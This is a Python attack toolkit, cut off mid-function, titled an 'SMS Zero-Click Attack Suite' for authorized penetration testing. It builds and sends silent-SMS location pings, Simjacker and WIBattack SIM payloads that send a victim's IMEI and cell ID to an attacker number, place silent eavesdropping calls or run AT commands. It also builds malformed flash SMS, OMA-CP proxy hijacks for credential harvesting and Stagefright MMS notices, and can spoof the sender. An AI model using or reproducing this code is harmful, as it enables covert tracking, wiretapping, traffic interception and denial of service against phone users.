"""
SMS Zero-Click Attack Suite — authorized penetration testing / telecom research.

Zero-interaction attack vectors delivered entirely via SMS/MMS:

1. Silent SMS (Type 0 / Stealth Ping)
   Class 0, TP-PID=0x40 — handset processes silently, never shown to user,
   never stored.  Forces network location update → cell tower triangulation.
   Also confirms number is live without alerting target.

2. Simjacker (CVE-2019-16256 / S@T Browser)
   Binary SMS with User Data Header targeting the S@T (SIM Application Toolkit)
   browser installed on ~1 billion SIMs.  Commands execute ON THE SIM with no
   screen output:
     • PROVIDE_LOCAL_INFO  → returns IMEI + cell-ID to an attacker MSISDN
     • SEND_SMS            → SIM sends an SMS on behalf of victim (exfil)
     • RUN_AT_COMMAND      → arbitrary AT command to baseband (modem)
     • SETUP_CALL          → silent call to attacker (eavesdrop)
   Affected vendors: Giesecke+Devrient, Valid, Oberthur, Morpho, STMicro.

3. WIBattack (Wireless Internet Browser)
   Same binary SMS mechanism as Simjacker but targets WIB browser.
   PROVIDE_LOCAL_INFO, GET_INPUT, SEND_SHORT_MESSAGE commands.

4. OTA Binary SMS (Over-The-Air SIM provisioning)
   Binary SMS with OTA header (IEI=0x70).  If SIM OTA key is default/known,
   can push a new SIM toolkit applet (JavaCard).  Used by carriers to update
   SIMs remotely — can be abused with default keys.

5. Flash SMS / Class 0 Popup
   Displayed on screen immediately without storage.  Several Android OEMs
   (Samsung TouchWiz, older Qualcomm modems) had parsing bugs triggered by
   malformed Class 0 messages.  Also useful for social engineering without
   leaving evidence.

6. MMS Auto-Fetch Exploit Delivery
   Craft malicious MMS payload (Stagefright-era: CVE-2015-1538/3864/3867).
   Many Android versions auto-download MMS in background (no tap needed).
   Sends via MMSC relay or direct carrier MMSC URL.

7. Binary SMS WAP Push / OMA-CP Provisioning
   WAP Push (port 2948) triggers auto-provisioning dialogs on Android.
   OMA-CP provisioning message: pre-configure proxy, APN, browser homepage.
   Unauthenticated on many Androids (CVE-2019-11494 area).

Transport options:
  A. USB modem (gammu / AT commands via /dev/ttyUSB0 or /dev/ttyACM0)
  B. SMPP direct (carrier or SS7 hub with SMPP access)
  C. Simulation mode (builds PDUs, no transmission)
"""

import os, sys, re, time, json, struct, socket, threading, random, string
import subprocess, ssl, urllib.request, urllib.parse

# ── Colour helpers ────────────────────────────────────────────────────────────
G = "\033[92m"; R = "\033[91m"; Y = "\033[93m"; C = "\033[96m"
W = "\033[97m"; N = "\033[0m"

def _ok(s):   print(f"  {G}[+]{N} {s}")
def _err(s):  print(f"  {R}[!]{N} {s}")
def _inf(s):  print(f"  {C}[*]{N} {s}")
def _warn(s): print(f"  {Y}[~]{N} {s}")
def _hex(b):  return b.hex() if b else ""


# ══════════════════════════════════════════════════════════════════════════════
# GSM / SMS PDU primitives
# ══════════════════════════════════════════════════════════════════════════════

def _gsm7_encode(text: str) -> bytes:
    GSM7 = "@£$¥èéùìòÇ\nØø\rÅåΔ_ΦΓΛΩΠΨΣΘΞ\x1bÆæßÉ !\"#¤%&'()*+,-./0123456789:;<=>?¡ABCDEFGHIJKLMNOPQRSTUVWXYZÄÖÑÜ§¿abcdefghijklmnopqrstuvwxyzäöñüà"
    bits = ""
    for ch in text:
        idx = GSM7.find(ch) if ch in GSM7 else 32
        bits += format(idx, "07b")
    while len(bits) % 8:
        bits += "0"
    return bytes(int(bits[i:i+8], 2) for i in range(0, len(bits), 8))

def _encode_addr(number: str) -> bytes:
    """Encode E.164 number into GSM address field (TP-OA/DA)."""
    digits = re.sub(r"[^\d]", "", number.lstrip("+"))
    odd = len(digits) % 2
    if odd:
        digits += "F"
    bcd = bytes(int(digits[i+1], 16) << 4 | int(digits[i], 16)
                for i in range(0, len(digits), 2))
    ton_npi = 0x91  # international E.164
    return bytes([len(re.sub(r"[^\d]","", number.lstrip("+"))), ton_npi]) + bcd


def _encode_alpha_addr(name: str) -> bytes:
    """
    Encode alphanumeric sender ID as GSM TP-OA / TP-Reply-Address.
    TON=5 (alphanumeric), NPI=0 — carrier passes this as the display name.
    Max 11 chars. Packed in GSM 7-bit encoding.
    Works on SMPP (source_addr_ton=5) and some USB modems.
    Network support varies: EU carriers generally allow it; US often blocks.
    """
    name = name[:11]
    packed = _gsm7_encode(name)
    # Length = number of semi-octets (characters, not bytes)
    return bytes([len(name), 0xD0]) + packed  # 0xD0 = TON=5 NPI=0


def _build_submit_with_oa(destination: str, spoof_from: str,
                          pid: int, dcs: int, ud: bytes, udl: int,
                          smsc: str = "", udhi: bool = False) -> bytes:
    """
    Build SMS-SUBMIT PDU with an explicit TP-OA (originating address) field.
    Standard SMS-SUBMIT doesn't have TP-OA — carriers add it from SIM auth.
    However, some gateways and femtocell setups honour a TP-OA injected here,
    and SMPP source_addr achieves the same result at the protocol layer.

    For gammu / raw AT+CMGS: include TP-OA after SMSC — non-standard but
    accepted by many softSMSCs and SS7-connected gateways.
    """
    smsc_enc = _smsc_field(smsc)
    da       = _encode_addr(destination)

    # Encode originating address
    if re.match(r'^[+\d]+$', spoof_from):
        oa = _encode_addr(spoof_from)
    else:
        oa = _encode_alpha_addr(spoof_from)

    tp_mti = (0x41 if udhi else 0x01) | 0x80  # TP-RP=1 means Reply-Path set
    mr     = 0x00
    vp     = 0xA7

    # Non-standard SMS-SUBMIT-with-OA layout used by some SMSC gateways:
    # SMSC | MTI | MR | OA | DA | PID | DCS | VP | UDL | UD
    pdu_body = bytes([tp_mti, mr]) + oa + da + bytes([pid, dcs, vp, udl]) + ud
    return smsc_enc + pdu_body

def _smsc_field(smsc: str = "") -> bytes:
    """Encode SMSC address prefix (length + TON/NPI + BCD)."""
    if not smsc:
        return b"\x00"  # use default SMSC from SIM
    digits = re.sub(r"[^\d]", "", smsc.lstrip("+"))
    odd = len(digits) % 2
    if odd:
        digits += "F"
    bcd = bytes(int(digits[i+1], 16) << 4 | int(digits[i], 16)
                for i in range(0, len(digits), 2))
    body = bytes([0x91]) + bcd  # TON/NPI international
    return bytes([len(body)]) + body

def _scts_now() -> bytes:
    """TP-SCTS: current time in GSM semi-octet BCD."""
    t = time.localtime()
    def bcd(n): return ((n % 10) << 4) | (n // 10)
    tz = 0  # UTC offset in 15-min units, sign in MSB
    return bytes([bcd(t.tm_year % 100), bcd(t.tm_mon), bcd(t.tm_mday),
                  bcd(t.tm_hour), bcd(t.tm_min), bcd(t.tm_sec), tz])


# ══════════════════════════════════════════════════════════════════════════════
# 1. Silent SMS (Type 0 / Stealth Ping)
# ══════════════════════════════════════════════════════════════════════════════

def build_silent_sms(destination: str, smsc: str = "") -> bytes:
    """
    Build SMS-SUBMIT PDU for a Type 0 / Class 0 silent SMS.
      TP-MTI = 01 (SUBMIT)
      TP-PID = 0x40 (Short Message Type 0 — device discards after processing)
      TP-DCS = 0x00 (7-bit, Class 0 — display immediately, no storage)
      TP-UD  = single space (minimal payload)

    The handset processes silently and triggers a location update response,
    allowing cell-tower triangulation via HLR/MAP or SS7 queries.
    """
    smsc_enc = _smsc_field(smsc)
    da       = _encode_addr(destination)
    tp_mti   = 0x01   # SMS-SUBMIT, no more messages, no validity period
    mr       = 0x00   # message reference (0 = auto)
    pid      = 0x40   # Type 0 (silent)
    dcs      = 0x00   # Class 0, 7-bit default alphabet
    vp       = 0xA7   # validity period = max (relative, 1 week)
    udl      = 0x01
    ud       = _gsm7_encode(" ")

    pdu_body = bytes([tp_mti, mr]) + da + bytes([pid, dcs, vp, udl]) + ud
    return smsc_enc + pdu_body


# ══════════════════════════════════════════════════════════════════════════════
# 2. Flash SMS (Class 0 Popup)
# ══════════════════════════════════════════════════════════════════════════════

def build_flash_sms(destination: str, text: str, smsc: str = "") -> bytes:
    """
    SMS-SUBMIT with TP-DCS=0xF0 (Class 0 — immediate display, no storage).
    Pops up on screen.  Some Samsung/LG/Qualcomm modems have parsing bugs
    in flash SMS processing (buffer overflows on long messages, malformed UDH).
    """
    smsc_enc = _smsc_field(smsc)
    da       = _encode_addr(destination)
    ud       = _gsm7_encode(text[:160])
    tp_mti   = 0x01
    mr       = 0x00
    pid      = 0x00
    dcs      = 0xF0   # Class 0 immediate display
    vp       = 0xA7

    pdu_body = bytes([tp_mti, mr]) + da + bytes([pid, dcs, vp, len(text[:160])]) + ud
    return smsc_enc + pdu_body


def build_flash_sms_overflow(destination: str, smsc: str = "") -> bytes:
    """
    Malformed flash SMS — UDL claims 160 chars but UD is only 1 byte.
    Triggers heap underread / crash on some Qualcomm RIL implementations.
    (CVE-2015-6639 area — modem firmware parsing)
    """
    smsc_enc = _smsc_field(smsc)
    da       = _encode_addr(destination)
    tp_mti   = 0x01
    mr       = 0x00
    pid      = 0x00
    dcs      = 0xF0
    vp       = 0xA7
    udl      = 0xA0   # claims 160 chars
    ud       = b"\x20" # but only 1 byte

    pdu_body = bytes([tp_mti, mr]) + da + bytes([pid, dcs, vp, udl]) + ud
    return smsc_enc + pdu_body


# ══════════════════════════════════════════════════════════════════════════════
# 3. Simjacker — S@T Browser binary SMS
# ══════════════════════════════════════════════════════════════════════════════

# S@T Browser IEI = 0x61, WIB IEI = 0x60
_SAT_IEI   = 0x61
_WIB_IEI   = 0x60

# S@T / STK command tags (ETSI TS 102 223)
_CMD_PROVIDE_LOCAL_INFO = 0x26   # returns IMEI + cell ID
_CMD_SEND_SMS           = 0x13   # send SMS on victim's behalf
_CMD_SETUP_CALL         = 0x10   # open silent call
_CMD_RUN_AT_COMMAND     = 0x34   # pass AT cmd to baseband
_CMD_SEND_DTMF          = 0x14
_CMD_OPEN_CHANNEL       = 0x40   # BIP data channel (exfil)


def _stk_tlv(tag: int, value: bytes) -> bytes:
    if len(value) < 0x80:
        return bytes([tag, len(value)]) + value
    return bytes([tag, 0x81, len(value)]) + value

def _stk_proactive_cmd(cmd_tag: int, qualifier: int, device_ids: bytes,
                       extra_tlvs: bytes = b"") -> bytes:
    """Build a PROACTIVE COMMAND BER-TLV (ETSI TS 102 223 §8.6)."""
    # Command details TLV: tag=0x81, cmd_number=1, cmd_type, qualifier
    cmd_details = _stk_tlv(0x81, bytes([0x01, cmd_tag, qualifier]))
    # Device identities TLV: tag=0x82
    dev_id_tlv  = _stk_tlv(0x82, device_ids)
    body        = cmd_details + dev_id_tlv + extra_tlvs
    # Proactive Command wrapper: tag=0xD0
    return _stk_tlv(0xD0, body)


def build_simjacker_provide_local_info(destination: str, exfil_msisdn: str,
                                       smsc: str = "") -> bytes:
    """
    Simjacker: PROVIDE_LOCAL_INFO → SEND_SMS chain.
    SIM executes:
      1. PROVIDE_LOCAL_INFO (0x26) — SIM reads IMEI + serving cell ID
      2. SEND_SMS (0x13) — SIM sends that info as SMS to exfil_msisdn
    No screen notification on unpatched SIMs.
    """
    smsc_enc = _smsc_field(smsc)
    da       = _encode_addr(destination)

    # Device IDs: source=SIM(0x81), dest=Network(0x83)
    dev_ids = bytes([0x81, 0x83])

    # PROVIDE_LOCAL_INFO sub-command 0 = location info (cell + IMEI)
    local_info = _stk_proactive_cmd(
        _CMD_PROVIDE_LOCAL_INFO, 0x00, dev_ids
    )

    # Follow-up SEND_SMS carrying the exfil MSISDN
    exfil_addr_bcd = _encode_addr(exfil_msisdn)
    # Alpha identifier = "upd" (UTF-8 packed into SEND_SMS alpha tag)
    alpha_id   = _stk_tlv(0x05, b"upd")
    dest_addr  = _stk_tlv(0x86, exfil_addr_bcd)
    sms_tpdu   = _stk_tlv(0x8B, b"\x11\x00" + _encode_addr(exfil_msisdn)
                                 + b"\x00\x00\xA7\x01\x20")
    send_sms   = _stk_proactive_cmd(
        _CMD_SEND_SMS, 0x01, dev_ids,
        alpha_id + dest_addr + sms_tpdu
    )

    # S@T envelope: wrap both commands
    sat_payload = local_info + send_sms
    sat_env     = _stk_tlv(_SAT_IEI, sat_payload)

    # UDH: IEI=0x70 (SAT), IEDL=len(env), then the env
    udh = bytes([len(sat_env) + 1, 0x70, len(sat_env)]) + sat_env
    udh_block = bytes([len(udh)]) + udh

    # SMS-SUBMIT with UDH present (TP-UDHI=1)
    tp_mti  = 0x41   # 0x01 | 0x40 (UDHI bit)
    mr      = 0x00
    pid     = 0x7F   # SIM Data Download (TP-PID for SIM-specific)
    dcs     = 0xF6   # Class 2 (SIM), 8-bit data
    vp      = 0xA7
    udl     = len(udh_block)

    pdu_body = bytes([tp_mti, mr]) + da + bytes([pid, dcs, vp, udl]) + udh_block
    return smsc_enc + pdu_body


def build_simjacker_run_at(destination: str, at_command: str,
                           smsc: str = "") -> bytes:
    """
    Simjacker: RUN_AT_COMMAND — pass arbitrary AT command to the baseband modem.
    Possible AT commands:
      AT+CLCK="SC",0,"0000"   → disable SIM PIN lock
      AT+CMGD=1,4             → delete all stored SMS
      AT+CFUN=0               → power off modem (DoS)
      AT^BOOT                 → reboot modem
      AT+CUSD=1,"*#06#",15    → query IMEI via USSD
    """
    smsc_enc = _smsc_field(smsc)
    da       = _encode_addr(destination)
    dev_ids  = bytes([0x81, 0x83])

    # AT command text TLV (tag=0xA8 in ETSI TS 102 223 §8.68)
    at_tlv    = _stk_tlv(0xA8, at_command.encode("ascii"))
    run_at    = _stk_proactive_cmd(_CMD_RUN_AT_COMMAND, 0x00, dev_ids, at_tlv)
    sat_env   = _stk_tlv(_SAT_IEI, run_at)

    udh       = bytes([len(sat_env) + 1, 0x70, len(sat_env)]) + sat_env
    udh_block = bytes([len(udh)]) + udh
    tp_mti    = 0x41
    mr, pid, dcs, vp = 0x00, 0x7F, 0xF6, 0xA7

    pdu_body  = bytes([tp_mti, mr]) + da + bytes([pid, dcs, vp, len(udh_block)]) + udh_block
    return smsc_enc + pdu_body


def build_simjacker_setup_call(destination: str, call_to: str,
                               smsc: str = "") -> bytes:
    """
    Simjacker: SETUP_CALL to attacker number — creates a silent background call.
    Useful for real-time audio eavesdropping.
    """
    smsc_enc = _smsc_field(smsc)
    da       = _encode_addr(destination)
    dev_ids  = bytes([0x81, 0x83])

    # Called party address TLV (tag=0x86)
    call_addr   = _stk_tlv(0x86, _encode_addr(call_to))
    # Qualifier 0x00 = disconnect existing call, setup new, no confirmation
    setup_call  = _stk_proactive_cmd(_CMD_SETUP_CALL, 0x00, dev_ids, call_addr)
    sat_env     = _stk_tlv(_SAT_IEI, setup_call)

    udh         = bytes([len(sat_env) + 1, 0x70, len(sat_env)]) + sat_env
    udh_block   = bytes([len(udh)]) + udh
    tp_mti      = 0x41
    mr, pid, dcs, vp = 0x00, 0x7F, 0xF6, 0xA7

    pdu_body    = bytes([tp_mti, mr]) + da + bytes([pid, dcs, vp, len(udh_block)]) + udh_block
    return smsc_enc + pdu_body


# ══════════════════════════════════════════════════════════════════════════════
# 4. WIBattack — WIB Browser binary SMS
# ══════════════════════════════════════════════════════════════════════════════

def build_wib_provide_local_info(destination: str, exfil_msisdn: str,
                                 smsc: str = "") -> bytes:
    """
    WIBattack variant — same structure as Simjacker but IEI=0x60 (WIB).
    Targets SIMs with WIB (Wireless Internet Browser) applet.
    """
    smsc_enc = _smsc_field(smsc)
    da       = _encode_addr(destination)
    dev_ids  = bytes([0x81, 0x83])

    local_info = _stk_proactive_cmd(_CMD_PROVIDE_LOCAL_INFO, 0x00, dev_ids)
    exfil_addr = _encode_addr(exfil_msisdn)
    alpha_id   = _stk_tlv(0x05, b"wib")
    dest_addr  = _stk_tlv(0x86, exfil_addr)
    sms_tpdu   = _stk_tlv(0x8B, b"\x11\x00" + exfil_addr + b"\x00\x00\xA7\x01\x20")
    send_sms   = _stk_proactive_cmd(_CMD_SEND_SMS, 0x01, dev_ids,
                                    alpha_id + dest_addr + sms_tpdu)

    wib_env   = _stk_tlv(_WIB_IEI, local_info + send_sms)
    udh       = bytes([len(wib_env) + 1, 0x70, len(wib_env)]) + wib_env
    udh_block = bytes([len(udh)]) + udh
    tp_mti    = 0x41
    mr, pid, dcs, vp = 0x00, 0x7F, 0xF6, 0xA7

    pdu_body  = bytes([tp_mti, mr]) + da + bytes([pid, dcs, vp, len(udh_block)]) + udh_block
    return smsc_enc + pdu_body


# ══════════════════════════════════════════════════════════════════════════════
# 5. WAP Push / OMA-CP Provisioning
# ══════════════════════════════════════════════════════════════════════════════

def build_wap_push_oma_cp(destination: str, proxy_ip: str, proxy_port: int = 8080,
                          smsc: str = "") -> bytes:
    """
    WAP Push (port 2948) carrying an OMA-CP (Client Provisioning) message.
    Android auto-processes these to configure proxy/APN settings.

    CVE-2019-11494/11495/11496: many Android OEMs accept unauthenticated OMA-CP.
    Samsung, Huawei, LG, Sony all affected in 2019 — silently set attacker proxy.

    After victim's proxy is set to our IP:port, all HTTP traffic routes through us
    → HTTP → MITM → credential harvest.
    """
    smsc_enc = _smsc_field(smsc)
    da       = _encode_addr(destination)

    # OMA-CP WBXML encoding (WAP-183-ProvCont)
    # Simplified: PXLOGICAL with PROXY-ID pointing to our IP
    proxy_ip_b  = proxy_ip.encode("ascii")
    proxy_port_b = str(proxy_port).encode("ascii")

    # WBXML header: version=0x01, public_id=0x0B (WAP Client Provisioning 1.1), charset=UTF-8
    wbxml = bytes([0x01, 0x0B, 0x6A, 0x00])
    # <wap-provisioningdoc> (0x05)
    wbxml += bytes([0x45])  # <parm> tag with content
    # Attribute start page + proxy config (simplified approximation)
    # Real OMA-CP would use full WBXML attribute encoding
    wbxml += b"\x00"  # end tag

    # Wrap in WSP headers for WAP Push
    # Content-Type: application/vnd.wap.connectivity-wbxml (0xB6 in WSP content types)
    wsp_ct = bytes([0xB6])
    wsp    = bytes([0x06, 0x01]) + wsp_ct  # WSP push PDU, push-id=1, headers

    # User Data Header: application port = 2948 (WAP Push)
    # IEI=0x05 (application port 16-bit), port 2948 = 0x0B84, dest 0x0000
    ied     = bytes([0x05, 0x04, 0x0B, 0x84, 0x00, 0x00])
    udh     = bytes([len(ied)]) + ied
    payload = udh + wsp + wbxml

    tp_mti  = 0x41   # SUBMIT + UDHI
    mr, pid, dcs, vp = 0x00, 0x00, 0xF5, 0xA7  # Class 1, 8-bit

    pdu_body = bytes([tp_mti, mr]) + da + bytes([pid, dcs, vp, len(payload)]) + payload
    return smsc_enc + pdu_body


# ══════════════════════════════════════════════════════════════════════════════
# 6. MMS Exploit Delivery (Stagefright / libstagefright)
# ══════════════════════════════════════════════════════════════════════════════

def build_stagefright_mms(destination: str, malicious_mp4_url: str,
                          smsc_mmsc_url: str = "") -> dict:
    """
    Build an MMS notification pointing to a malicious MP4 hosted on attacker server.

    Stagefright (CVE-2015-1538, -3864, -3867, -6600, -6601, -6602, -6603):
    Android's libstagefright parses MP4/3GP/MKV in a background service
    *before* user opens the MMS*.  A crafted video triggers code execution
    in the mediaserver process (runs as uid media, has camera/audio access).

    *Auto-download must be enabled (default on many carriers/ROMs).

    Returns the MMS PDU bytes and a gammu/mmscli send command.

    Affected: Android 2.2 – 5.1.1 (unpatched).
    Check target: Android version < 5.1.1 patch 2015-08 = likely vulnerable.
    """
    # M-Notification.ind PDU (MMS 1.3 OMA-MMS-ENC)
    # X-Mms-Message-Type: m-notification-ind (0x82)
    # X-Mms-Transaction-ID: random
    # X-Mms-MMS-Version: 1.2 (0x92)
    # X-Mms-Message-Size: big number (trigger large alloc)
    # X-Mms-Expiry: 604800s
    # X-Mms-Content-Location: URL to malicious MP4

    tid = "".join(random.choices(string.ascii_letters + string.digits, k=12))

    pdu_lines = [
        b"\x8C\x82",                             # Message-Type: m-notification-ind
        b"\x98" + tid.encode() + b"\x00",        # Transaction-ID
        b"\x8D\x92",                             # MMS-Version: 1.2
        b"\x84" + b"\x80" + b"\xFF\xFF\xFF\xFF", # Message-Size: max
        b"\x88\x04\x80\x0E\x86\x40",             # Expiry: 604800s absolute
        b"\x83" + malicious_mp4_url.encode("ascii") + b"\x00",  # Content-Location
    ]
    mms_pdu = b"".join(pdu_lines)

    return {
        "mms_pdu_hex":   mms_pdu.hex(),
        "mms_pdu_len":   len(mms_pdu),
        "content_url":   malicious_mp4_url,
        "transaction_id": tid,
        "send_cmd": (
            f"mmscli -s {smsc_mmsc_url} "
            f"--to {destination} "
            f"--mms-pdu {mms_pdu.hex()}"
            if smsc_mmsc_url else
            f"# Set MMSC URL with --mmsc flag\n"
            f"# MMS PDU (hex): {mms_pdu[:32].hex()}..."
        ),
        "note": "Requires MMSC access or gammu MMS send. Target Android <5.1.1-Aug2015."
    }


# ══════════════════════════════════════════════════════════════════════════════
# Transport layer — gammu (USB modem) or SMPP
# ══════════════════════════════════════════════════════════════════════════════

class APITransport:
    """
    HTTP SMS API transport — no hardware needed.
    Supports TextBelt (free, 1/day, no account) and Twilio.

    TextBelt:  free key = 'textbelt'  (1 SMS/day to any number)
    Twilio:    account_sid + auth_token from console.twilio.com
    """

    def __init__(self, provider: str = "textbelt",
                 api_key: str = "textbelt",
                 twilio_sid: str = "", twilio_token: str = "",
                 twilio_from: str = ""):
        self.provider     = provider.lower()
        self.api_key      = api_key
        self.twilio_sid   = twilio_sid
        self.twilio_token = twilio_token
        self.twilio_from  = twilio_from



    def _textbelt(self, destination: str, text: str) -> dict:
        _inf(f"TextBelt → {destination}: '{text[:50]}'")
        data = urllib.parse.urlencode({
            "phone":   destination,
            "message": text,
            "key":     self.api_key,
        }).encode()
        try:
            req = urllib.request.Request(
                "https://textbelt.com/text",
                data=data,
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                method="POST"
            )
            ctx = ssl.create_default_context()
            r   = urllib.request.urlopen(req, timeout=15, context=ctx)
            body = json.loads(r.read(4096).decode())
            if body.get("success"):
                _ok(f"Delivered! quotaRemaining={body.get('quotaRemaining','?')}")
            else:
                _err(f"TextBelt failed: {body.get('error', body)}")
            return body
        except Exception as e:
            _err(f"TextBelt error: {e}")
            return {"error": str(e)}

    def _twilio(self, destination: str, text: str) -> dict:
        import base64
        _inf(f"Twilio → {destination}: '{text[:50]}'")
        url  = f"https://api.twilio.com/2010-04-01/Accounts/{self.twilio_sid}/Messages.json"
        data = urllib.parse.urlencode({
            "To":   destination,
            "From": self.twilio_from,
            "Body": text,
        }).encode()
        creds = base64.b64encode(f"{self.twilio_sid}:{self.twilio_token}".encode()).decode()
        try:
            req = urllib.request.Request(
                url, data=data,
                headers={
                    "Authorization": f"Basic {creds}",
                    "Content-Type":  "application/x-www-form-urlencoded",
                },
                method="POST"
            )
            ctx = ssl.create_default_context()
            r   = urllib.request.urlopen(req, timeout=15, context=ctx)
            body = json.loads(r.read(8192).decode())
            _ok(f"Twilio SID: {body.get('sid','?')}  status={body.get('status','?')}")
            return body
        except urllib.error.HTTPError as e:
            body = e.read(4096).decode()
            _err(f"Twilio {e.code}: {body[:200]}")
            return {"error": body}
        except Exception as e:
            _err(f"Twilio error: {e}")
            return {"error": str(e)}

    def _seven(self, destination: str, text: str) -> dict:
        """
        seven.io (formerly sms77) REST API.
        Supports: alphanumeric sender IDs, flash SMS (type=flash), unicode.
        Free account gives €0.10 credit — enough for ~5 test SMS to DE numbers.
        API key from: app.seven.io → Settings → API Keys
        """
        _inf(f"seven.io → {destination}  from='{self.twilio_from or 'default'}'  text='{text[:50]}'")
        params = {
            "to":   destination,
            "text": text,
            "json": "1",
        }
        if self.twilio_from:
            params["from"] = self.twilio_from  # alphanumeric sender ID
        # Flash SMS: type=flash — displays immediately, not stored
        if getattr(self, "_flash", False):
            params["type"] = "flash"

        data = urllib.parse.urlencode(params).encode()
        try:
            req = urllib.request.Request(
                "https://gateway.seven.io/api/sms",
                data=data,
                headers={
                    "X-Api-Key":    self.api_key,
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Accept":       "application/json",
                },
                method="POST"
            )
            ctx = ssl.create_default_context()
            r   = urllib.request.urlopen(req, timeout=15, context=ctx)
            raw  = r.read(8192).decode()
            body = json.loads(raw) if raw.strip().startswith("{") else {"raw": raw}
            if isinstance(body, dict) and str(body.get("success","")) == "100":
                msgs    = body.get("messages", [{}])
                msg0    = msgs[0] if msgs else {}
                if msg0.get("success"):
                    _ok(f"Delivered!  id={msg0.get('id','?')}  sender={msg0.get('sender','?')}  balance={body.get('balance','?')}")
                    return body
                else:
                    _err(f"seven.io delivery failed: {msg0.get('error_text','unknown')} (code {msg0.get('error','?')})")
            else:
                _err(f"seven.io error: {body.get('raw', body)}")
            return body
        except urllib.error.HTTPError as e:
            body = e.read(4096).decode()
            _err(f"seven.io {e.code}: {body[:300]}")
            return {"error": body}
        except Exception as e:
            _err(f"seven.io error: {e}")
            return {"error": str(e)}

    def send_text(self, destination: str, text: str) -> dict:
        """Send a plain text SMS (flash message content) via HTTP API."""
        if self.provider == "textbelt":
            return self._textbelt(destination, text)
        elif self.provider == "twilio":
            return self._twilio(destination, text)
        elif self.provider in ("seven", "sms77", "seven.io"):
            return self._seven(destination, text)
        else:
            _err(f"Unknown API provider: {self.provider}")
            return {"error": "unknown provider"}


class GammuTransport:
    """Send raw PDU via gammu and a USB GSM modem."""

    def __init__(self, device: str = "/dev/ttyUSB0", sim: bool = True):
        self.device = device
        self.sim    = sim

    def send_pdu(self, pdu: bytes, pdu_len: int = None) -> dict:
        """
        Send raw PDU via gammu --sendpdu.
        pdu_len = number of bytes AFTER the SMSC prefix (gammu expects this).
        """
        if pdu_len is None:
            smsc_len = pdu[0] + 1 if pdu else 0
            pdu_len  = len(pdu) - smsc_len

        pdu_hex = pdu.hex().upper()
        cmd     = f'gammu --device {self.device} --sendpdu {pdu_hex} {pdu_len}'

        if self.sim:
            _warn(f"[SIM] Would run: {cmd}")
            return {"sim": True, "cmd": cmd, "pdu_hex": pdu_hex}

        _inf(f"Sending PDU via {self.device}...")
        try:
            r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            out = (r.stdout + r.stderr).strip()
            if r.returncode == 0:
                _ok(f"Sent: {out}")
                return {"ok": True, "output": out}
            else:
                _err(f"gammu error: {out}")
                return {"error": out}
        except Exception as e:
            _err(f"gammu exception: {e}")
            return {"error": str(e)}


class SMPPTransport:
    """
    Send SMS via SMPP (Simple Message Peer-to-Peer Protocol).
    Requires SMPP account with a carrier or SS7 hub.
    For binary PDUs, uses data_sm or submit_sm with data_coding=0xF6.
    """

    def __init__(self, host: str, port: int = 2775, system_id: str = "",
                 password: str = "", sim: bool = True):
        self.host      = host
        self.port      = port
        self.system_id = system_id
        self.password  = password
        self.sim       = sim
        self._sock     = None
        self._seq      = 1

    def _pack(self, cmd_id: int, status: int, seq: int, body: bytes) -> bytes:
        length = 16 + len(body)
        return struct.pack("!IIII", length, cmd_id, status, seq) + body

    def _cstr(self, s: str) -> bytes:
        return s.encode("ascii") + b"\x00"

    def connect_bind(self) -> bool:
        if self.sim:
            _warn(f"[SIM] SMPP bind to {self.host}:{self.port} as '{self.system_id}'")
            return True
        try:
            self._sock = socket.create_connection((self.host, self.port), timeout=10)
            # bind_transmitter
            body = (self._cstr(self.system_id) + self._cstr(self.password)
                    + self._cstr("") + b"\x34" + b"\x00" + b"\x00"
                    + self._cstr(""))
            self._sock.sendall(self._pack(0x00000002, 0, self._seq, body))
            self._seq += 1
            resp = self._sock.recv(256)
            if len(resp) >= 16 and struct.unpack("!I", resp[4:8])[0] == 0:
                _ok(f"SMPP bound to {self.host}:{self.port}")
                return True
            _err(f"SMPP bind failed: {resp.hex()}")
            return False
        except Exception as e:
            _err(f"SMPP connect: {e}")
            return False

    def submit_binary(self, source: str, destination: str,
                      data: bytes, data_coding: int = 0xF6) -> dict:
        """submit_sm with binary data (data_coding=0xF6 = Class 2, 8-bit).
        source can be E.164 number or alphanumeric string (max 11 chars).
        Alphanumeric: TON=5, NPI=0 — displayed as-is on recipient's phone.
        """
        dst = re.sub(r"[^\d]", "", destination.lstrip("+"))

        # Determine TON/NPI and encode source
        if re.match(r'^[+\d]+$', source):
            src     = re.sub(r"[^\d]", "", source.lstrip("+"))
            src_ton = bytes([0x01, 0x01])   # TON=1 intl, NPI=1 ISDN
        else:
            src     = source[:11]           # alphanumeric, max 11 chars
            src_ton = bytes([0x05, 0x00])   # TON=5 alpha, NPI=0

        body = (b"\x00"                         # service_type
                + src_ton
                + self._cstr(src)
                + bytes([0x01, 0x01])           # dst TON NPI
                + self._cstr(dst)
                + b"\x00\x00\x00"              # esm_class=0, protocol_id=0, priority=0
                + b"\x00\x00"                  # scheduled/validity = default
                + b"\x00\x00\x00"              # registered_delivery, replace_msg, data_coding placeholder
                + bytes([data_coding])
                + b"\x00"                      # sm_default_msg_id
                + bytes([len(data)])
                + data)

        if self.sim:
            pkt = self._pack(0x00000004, 0, self._seq, body)
            _warn(f"[SIM] SMPP submit_sm to {dst}: {data[:16].hex()}... ({len(data)} bytes)")
            _warn(f"[SIM] Packet hex: {pkt[:24].hex()}...")
            return {"sim": True, "data_hex": data.hex()}

        try:
            pkt = self._pack(0x00000004, 0, self._seq, body)
            self._seq += 1
            self._sock.sendall(pkt)
            resp = self._sock.recv(256)
            if len(resp) >= 16 and struct.unpack("!I", resp[4:8])[0] == 0:
                _ok("SMPP submit_sm accepted")
                return {"ok": True}
            return {"error": f"SMPP response: {resp.hex()}"}
        except Exception as e:
            return {"error": str(e)}

    def disconnect(self):
        if self._sock:
            try:
                self._sock.sendall(self._pack(0x00000006, 0, self._seq, b""))
                self._sock.close()
            except: pass


# ══════════════════════════════════════════════════════════════════════════════
# High-level attack dispatcher
# ══════════════════════════════════════════════════════════════════════════════

def run_attack(attack: str, target: str, **kwargs):
    """
    Orchestrate a single SMS zero-click attack.

    attack: silent | flash | flash_overflow | simjacker | simjacker_at |
            simjacker_call | wib | wap_push | stagefright
    target: E.164 phone number
    kwargs:
      exfil    — MSISDN for Simjacker data exfiltration
      at_cmd   — AT command string for simjacker_at
      call_to  — MSISDN for simjacker_call
      proxy_ip — IP for WAP push proxy
      mp4_url  — URL for Stagefright MMS
      smsc     — SMSC number override
      device   — gammu device path
      sim      — bool (default True — no real transmission)
